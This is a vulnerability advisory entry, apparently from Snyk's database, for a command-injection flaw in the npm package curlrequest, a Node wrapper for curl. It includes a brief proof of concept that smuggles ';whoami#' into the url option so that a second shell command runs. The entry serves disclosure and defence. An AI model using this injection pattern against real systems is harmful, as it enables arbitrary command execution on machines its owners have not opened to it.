- id: snykio:npm:curlrequest:568274
  title: Command Injection
  description: "[curlrequest][1] is a curlrequest is a node wrapper for the command
    line\ncurl(1).\n\nAffected versions of this package are vulnerable to Command
    Injection.\nIt is possible to inject arbitrary commands by using a semicolon char
    in\nany of the `options` values.\n\n### PoC   {#poc}\n\n    var curl = require(\"curlrequest\");\n
    \   \n    let userPayload = \";whoami#\";\n    curl.request({ url: userPayload,
    pretend: true }, function(err, stdout, meta) {\n      console.log(\"%s %s\", meta.cmd,
    meta.args.join(\" \"));\n    });\n\n\n\n[1]: https://www.npmjs.com/package/curlrequest\n"
  affected_package: curlrequest
